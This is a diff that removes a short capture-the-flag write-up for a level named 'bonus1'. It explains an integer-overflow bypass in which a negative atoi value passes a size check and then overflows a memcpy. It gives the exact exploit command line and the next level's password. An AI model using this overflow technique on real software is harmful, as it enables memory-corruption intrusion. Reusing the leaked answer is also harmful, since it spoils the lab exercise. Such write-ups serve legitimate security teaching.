@@ -1,9 +1,0 @@
-atoi take a signed int, memcpy an unsigned int
-the value -2147483637 * 4 = 44 (size of str + size of int)
--2147483637 <= 9 -> it's a valid value
-
-./bonus1 -2147483637 `perl -e 'print "A"x40 . "FLOW"'`
-
-password bonus2 : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
-
-
